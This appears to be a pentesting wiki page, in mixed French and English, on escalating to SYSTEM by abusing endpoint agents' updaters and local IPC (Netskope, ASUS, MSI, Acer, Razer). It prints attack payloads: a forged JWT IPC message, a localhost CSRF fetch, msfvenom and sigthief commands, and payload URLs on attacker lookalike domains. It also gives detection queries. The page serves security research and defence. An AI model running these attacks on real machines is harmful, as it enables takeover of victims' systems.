# Abuser des Enterprise Auto-Updaters et du Privileged IPC (p. ex., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes de Windows local privilege escalation trouvées dans des agents et updaters d’endpoint enterprise qui exposent une surface IPC à faible friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faible privilège peut forcer l’enrôlement vers un serveur contrôlé par l’attaquant, puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés que vous pouvez réutiliser contre des produits similaires :
- Abuse d’un IPC localhost d’un service privilégié pour forcer le ré-enrôlement ou une reconfiguration vers un serveur attaquant.
- Implémentez les endpoints de mise à jour du vendor, livrez une Trusted Root CA de rogue, et pointez l’updater vers un package malveillant, “signé”.
- Contournez les faibles contrôles de signer (CN allow-lists), les flags de digest optionnels, et les propriétés MSI laxistes.
- Si l’IPC est “encrypted”, dérivez la key/IV à partir d’identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injectez dans un process allow-listé ou créez-en un en suspended puis amorcez votre DLL via un patch minimal du thread-context.

---
## 1) Forcer l’enrôlement vers un serveur attaquant via localhost IPC

De nombreux agents embarquent un processus UI en mode utilisateur qui communique avec un service SYSTEM via localhost TCP en utilisant JSON.

Observé dans Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d’exploitation :
1) Fabriquez un jeton d’enrôlement JWT dont les claims contrôlent l’hôte backend (par ex., AddonUrl). Utilisez alg=None afin qu’aucune signature ne soit requise.
2) Envoyez le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à interroger votre rogue server pour l’enrollment/config, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant est basée sur le path/le nom, faites partir la requête depuis un binaire vendor allow-listé (voir §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Une fois que le client parle à votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Retournez une config JSON avec un intervalle d’updater très court, par ex. :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le Local Machine Trusted Root store.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre rogue CA peut émettre un leaf avec ce CN et signer le MSI.
- CERT_DIGEST property: incluez une propriété MSI bénigne nommée CERT_DIGEST. Aucune enforcement à l’installation.
- Optional digest enforcement: config flag (par exemple, check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Result: le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatise un rogue CA, la signature d’un MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Énumérez les named pipes candidats :
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraire les données de routage soutenues par le registre utilisées par les serveurs IPC basés sur des plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraire d'abord les noms d'endpoint, les clés JSON et les IDs de commande depuis le client en user-mode. Les frontends Electron/.NET packés fuient fréquemment le schéma complet :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cherchez la véritable prédicat de confiance, pas seulement le chemin de code qui lance finalement le processus :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` signifie généralement que « le certificat existe » a été traité comme « le certificat est trusted », ce qui permet le certificate cloning ou d’autres fake-signer tricks.
- Les vérifications par sous-chaîne ou suffixe sur `Origin`, `Referer`, les download URLs, les noms de processus, ou les signer CNs ne sont pas de l’authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines ressemblants contrôlés par l’attaquant.
- Si le GUI à faibles privilèges décide « the file is trusted » et que le broker SYSTEM se contente d’utiliser ce résultat, patcher ou réimplémenter la DLL/JS côté client contourne souvent entièrement la frontière (split validation de style Razer).
- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp` puis le valide ou le planifie depuis ce chemin, testez immédiatement les fenêtres de remplacement TOCTOU et les modules plugin frères qui exposent des wrappers alternatifs `ExecuteTask()` avec des checks plus faibles.

Pour les cibles très centrées sur named-pipe, PipeViewer est un moyen rapide d’identifier des DACLs faibles et des pipes accessibles à distance avant de commencer à reverse le protocol en profondeur.

Si la cible authentifie les appelants uniquement par PID, image path, ou process name, considérez cela comme un speed bump plutôt que comme une frontière : injecter dans le client légitime, ou établir la connexion depuis un process allow-listed, suffit souvent à satisfaire les checks du serveur. Pour les named pipes en particulier, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) couvre le primitive plus en profondeur.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub fournit un service HTTP en user-mode (ADU.exe) sur 127.0.0.1:53000 qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origin effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les download URLs exposées par `/asus/v1.0/*`. Tout hôte contrôlé par l’attaquant, tel que `https://driverhub.asus.com.attacker.tld`, passe donc la vérification et peut émettre des requêtes modifiant l’état depuis JavaScript. Voir [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour d’autres patterns de contournement.

Flux pratique :
1) Enregistrez un domaine qui intègre `.asus.com` et hébergez-y une page web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par ex. `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le handler – le JS frontend packagé montre le schéma ci-dessous.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même la CLI PowerShell montrée ci-dessous réussit lorsque l'en-tête Origin est usurpé avec la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Vérification de code-signing insecure & clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique par substring, donc `http://updates.asus.com.attacker.tld:8000/payload.exe` est acceptée. Après le téléchargement, ADU.exe vérifie seulement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour weaponize le flow :
1) Créez un payload (par ex., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signer ASUS dans celui-ci (par ex., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenchez UpdateApp via le browser CSRF ci-dessus.

Comme à la fois les filtres Origin et URL sont basés sur des substring, et que la vérification du signer compare seulement des chaînes, DriverHub récupère et exécute le binaire de l’attaquant sous son contexte élevé.

---
## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque frame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le Subject du certificat doit être “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la Frame A pointant vers un binaire légitime signé par MSI (garantit que la vérification de signature passe et que la tâche est mise en file).
- La concurrencer avec des messages Frame B répétés pointant vers un payload malveillant, en écrasant `MSI Center SDK.exe` juste après la fin de la vérification.

Quand le scheduler se déclenche, il exécute le payload écrasé en SYSTEM malgré la validation du fichier original. Une exploitation fiable utilise deux goroutines/threads qui spamment `CMD_AutoUpdateSDK` jusqu’à gagner la fenêtre TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers bytes d’une frame sélectionnent ce composant, permettant aux attaquants de router des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune** validation de signature – n’importe quel utilisateur local peut lui faire pointer `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM déterministe.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients Go/ Python custom peuvent ensuite rejouer les frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire autorise des clients distants (par ex., `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine de lancement de processus du service.
- La bibliothèque cliente sérialise un byte de terminaison magique (113) avec les args. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) fait tomber dans la branche générique qui conserve le token SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc en SYSTEM non restreint, à la fois localement et à distance.
- Combinez cela avec l’option d’installateur exposée (`Setup.exe -nocheck`) pour déployer ACC même sur des VM de laboratoire et utiliser la pipe sans matériel du vendor.

Ces bugs IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des tokens) et pourquoi chaque helper “run arbitrary binary” de module doit partager les mêmes vérifications de signer.

---
## 3) Helpers COM/IPC “elevator” appuyés par une validation user-mode faible (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre pattern utile à cette famille : un utilisateur à faible privilège peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL user-mode (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la frontière privilégiée.

Chemin d’exploitation observé :
- Instanciez l’objet COM `RzUtility.Elevator`.
- Appelez `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement élevé.
- Dans le PoC public, la gate de signature PE dans `simple_service.dll` est patchée avant l’envoi de la requête, permettant le lancement d’un exécutable arbitraire choisi par l’attaquant.

Invocation PowerShell minimale :
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway général : lors de l’analyse de suites « helper », ne vous arrêtez pas à localhost TCP ou aux named pipes. Vérifiez les COM classes avec des noms comme `Elevator`, `Launcher`, `Updater`, ou `Utility`, puis confirmez si le service privilégié valide réellement le binaire cible lui-même ou s’il fait simplement confiance à un résultat calculé par une DLL client en mode utilisateur patchable. Ce schéma s’étend au-delà de Razer : toute conception séparée où le broker à haute privilège consomme une décision allow/deny provenant de la partie à faible privilège est une candidate surface de privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement derrière le flux de mise à jour de Notepad++ ont servi sélectivement des manifests malveillants à des victimes choisies. Les anciens updaters basés sur WinGUp ne vérifiaient pas complètement l’authenticité des mises à jour, donc une réponse XML hostile pouvait rediriger les clients vers des URL contrôlées par l’attaquant. Comme le client acceptait du contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installateur téléchargé, les victimes ont récupéré et exécuté un `update.exe` NSIS trojanisé.

Flux opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux checks de mise à jour avec des métadonnées attaquantes pointant vers une URL de téléchargement malveillante.
2. **NSIS trojanisé** : l’installateur récupère/exécute un payload et abuse de deux chaînes d’exécution :
- **Bring-your-own signed binary + sideload** : empaqueter le `BluetoothService.exe` signé de Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Quand le binaire signé s’exécute, Windows sideload `log.dll`, qui déchiffre et charge de manière reflective la backdoor Chrysalis (protégée par Warbird + API hashing pour gêner la détection statique).
- **Scripted shellcode injection** : NSIS exécute un script Lua compilé qui utilise des API Win32 (p. ex. `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.

Points de durcissement/détection pour tout auto-updater :
- Imposer la **vérification du certificat + de la signature** de l’installateur téléchargé (pin du signer éditeur, rejet des CN/chaînes non correspondants) et signer le manifest de mise à jour lui-même (p. ex. XMLDSig). Bloquer les redirections contrôlées par le manifest sauf validation.
- Traiter le **BYO signed binary sideloading** comme un pivot de détection post-téléchargement : alerter quand un EXE éditeur signé charge un nom de DLL provenant de dehors de son chemin d’installation canonique (p. ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads) et quand un updater dépose/exécute des installateurs depuis temp avec des signatures non éditeur.
- Surveiller les **artefacts spécifiques au malware** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` dans `%TEMP%`, et étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a réagi en renforçant WinGUp dans v8.8.9 et versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les nouvelles builds imposent la vérification du certificat + de la signature de l’installateur téléchargé au lieu de faire confiance au transport seul.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un programme d’installation autre que Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces patterns se généralisent à tout updater qui accepte des manifests non signés ou ne verrouille pas les signers de l’installer — network hijack + malicious installer + BYO-signed sideloading permet d’obtenir une remote code execution sous couvert de mises à jour « trusted ».

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
